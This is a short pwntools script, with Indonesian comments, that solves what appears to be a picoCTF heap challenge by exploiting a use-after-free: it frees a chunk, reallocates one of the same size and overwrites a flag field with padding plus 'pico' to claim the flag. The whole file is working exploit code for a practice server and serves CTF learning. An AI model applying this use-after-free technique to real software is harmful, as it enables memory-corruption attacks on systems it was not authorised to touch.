from pwn import *

p = remote("tethys.picoctf.net",52332)

junk = 30
flag = b"pico"
payload = b"A" * junk
payload += flag

p.sendlineafter(": ",b"5") # Untuk mengfree malloc x agar menciptakan dangling pointer yang bisa kita manfaatkan, karena developer lupa untuk set malloc menjadi NULL dan meninggalkan pointer lama
p.sendlineafter(": ",b"2") # memanggil fungsi allocate, untuk menaruh chunk baru kita yang akan di arahkan di memory lama malloc x, otomatis akan nyambung ke pointer lama dan bisa overwrite x->flag == bico dan menggantinya menjadi x->flag = pico
p.sendlineafter(": ",b"35") # menciptakan 35 chunk sized, 34 tidak papa tetapi aku main aman saja agar sama, sebenarnya 25 juga bisa karena komputer akan otomatis mengubah ke 32 dan masih bisa overwrite walaupun tidak sampai x->flag, hanya sampai pi saja
p.sendlineafter(": ",payload) # kirim payload kita ke chunk baru yang sudah terkait dangling pointer, dengan begini x->flag = bico sudah di ganti menjadi x->flag = pico
p.sendlineafter(": ",b"4") # claim flag
print(p.recvall()) # print flag kita